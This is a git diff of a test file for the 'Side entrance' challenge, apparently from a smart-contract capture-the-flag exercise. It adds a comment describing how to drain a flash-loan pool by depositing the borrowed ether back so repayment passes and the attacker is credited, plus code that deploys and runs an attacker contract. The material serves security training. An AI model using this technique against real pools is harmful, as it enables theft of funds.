@@ -24,7 +24,14 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+          /** CODE YOUR EXPLOIT HERE */
+        /** We can receive the flash loan and deposite that into the contract.
+         * The deposite() payable will put the amount back in contract's balance but will assign the amount to the attacker address.
+         * This way, we can pass the (loan returned) condition while being eligible to withdraw it after flashLoan() execution
+         */
+        const SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', attacker);
+        this.AttackerContract = await SideEntranceAttackerFactory.deploy(this.pool.address, ETHER_IN_POOL, attacker.address);
+        await this.AttackerContract.attack();
     });
 
     after(async function () {
